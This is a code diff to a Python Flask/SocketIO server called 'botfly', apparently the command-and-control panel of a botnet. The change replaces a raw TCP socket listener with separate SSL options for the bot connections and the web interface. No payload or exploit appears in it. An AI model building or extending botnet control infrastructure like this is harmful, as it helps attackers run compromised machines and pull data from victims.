@@ -2,7 +2,6 @@ import eventlet
 eventlet.monkey_patch()
 
 import os
-import socket
 import flask
 from flask import request
 import flask_login
@@ -10,6 +9,7 @@ from flask_login import LoginManager, login_required
 from flask_socketio import SocketIO
 import json
 from OpenSSL import SSL, crypto
+import sys
 
 
 # Loading library depends on how we want to setup the project later,
@@ -28,8 +28,6 @@ except:
  To run: python server.py'''
 
 HOSTNAME = 'botfly'
-HOST = '0.0.0.0'
-PORT = 1708
 UPLOAD_FOLDER = 'static/uploads/'
 DOWNLOAD_FOLDER = 'media/downloads/'
 
@@ -304,21 +302,29 @@ def create_self_signed_cert(certfile, keyfile, certargs, cert_dir="."):
         open(K_F, "wb").write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
 
 if __name__ == "__main__":
-    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    TCPSOCK.bind((HOST, PORT))
+
+    USE_SSL_FLASK = False
+    USE_SSL_BOTS = True
+
+    if (USE_SSL_BOTS or USE_SSL_FLASK) and (sys.version_info.major, sys.version_info.minor) >= (3,6):
+        print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n\ttry a different python version or turn off SSL")
+
+    CERT_DIR = "cert"
+    CERT_FILE = "cert.pem"
+    KEY_FILE = "key.pem"
 
     botnet = BotNet(socketio,downloadpath=DOWNLOAD_FOLDER)
-    botserver = BotServer(TCPSOCK, botnet, socketio)
+    if USE_SSL_BOTS:
+        botserver = BotServer(botnet, socketio,
+                              certfile=os.path.join(CERT_DIR,CERT_FILE),
+                              keyfile=os.path.join(CERT_DIR,KEY_FILE))
+    else:
+        botserver = BotServer(botnet, socketio)
 
     botnet.start()
     botserver.start()
 
-    USE_SSL = False
-    if USE_SSL:
-        CERT_DIR = "cert"
-        CERT_FILE = "cert.pem"
-        KEY_FILE = "key.pem"
+    if USE_SSL_FLASK:
         create_self_signed_cert(CERT_FILE, KEY_FILE,
                                 certargs=
                                 {"Country": "US",
